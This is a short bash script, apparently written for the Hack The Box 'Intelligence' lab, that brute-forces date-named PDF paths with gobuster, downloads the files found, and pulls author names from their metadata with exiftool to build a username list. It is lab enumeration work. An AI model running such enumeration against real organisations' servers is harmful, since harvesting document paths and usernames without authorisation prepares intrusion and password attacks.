#!/bin/bash
# Author: Mardcore

for i in {01..12};
  do for x in {01..31};
    do echo 2020-$i-$x-upload >> bruteforce
    done
  done

gobuster dir -u http://dc.intelligence.htb/documents/ -w bruteforce -t 25 -x pdf -q > urls

cat urls | awk '{print $1}' | sed 's/\//\n/g' | grep ^2 > pdf

while IFS= read -r line
do
  wget -q http://intelligence.htb/documents/$line
done < pdf

exiftool 2020* | grep Creator | awk '{print $3}' >> users2

cat users2 | sort | uniq > users

rm bruteforce urls pdf users2
